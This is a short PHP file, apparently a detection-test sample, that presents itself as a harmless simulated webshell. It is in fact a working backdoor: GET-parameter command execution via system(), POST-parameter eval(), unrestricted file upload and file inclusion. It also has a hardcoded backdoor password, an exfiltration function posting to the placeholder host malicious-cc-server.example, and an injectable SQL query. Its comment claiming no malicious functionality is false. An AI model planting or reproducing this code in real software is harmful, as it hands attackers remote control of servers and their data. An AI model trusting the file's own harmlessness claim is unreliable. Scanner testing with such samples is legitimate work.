<?php
// Simulated PHP backdoor/webshell that would trigger security alerts
// This is a demonstration - no actual malicious functionality

// Command execution backdoor pattern
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

// File upload backdoor pattern
if(isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
    echo "File uploaded: " . $_FILES['upload']['name'];
}

// File inclusion backdoor pattern
if(isset($_GET['file'])) {
    include($_GET['file']);
}

// Database credentials theft
$db_user = "admin";
$db_pass = "s3cret_passw0rd!";
$db_host = "localhost";
$db_name = "users";

// Password hash dumping
$admin_hash = "$2y$10$R8rvY4AHgsN0o9cJjFOO3ur.jQUoJEEwVlDLPBvLN7A9fzwFQSNl6";

// Sending data to C&C server
function send_data($data) {
    $url = "https://malicious-cc-server.example/exfil.php";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Backdoor login
if(isset($_POST['password']) && $_POST['password'] == "backdoor123") {
    echo "<h1>Backdoor Access Granted</h1>";
}

// Malicious eval pattern
if(isset($_POST['code'])) {
    eval($_POST['code']);
}

// Raw SQL query without sanitization (SQLi pattern)
if(isset($_GET['id'])) {
    $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
    // mysqli_query($conn, $query);
}
?>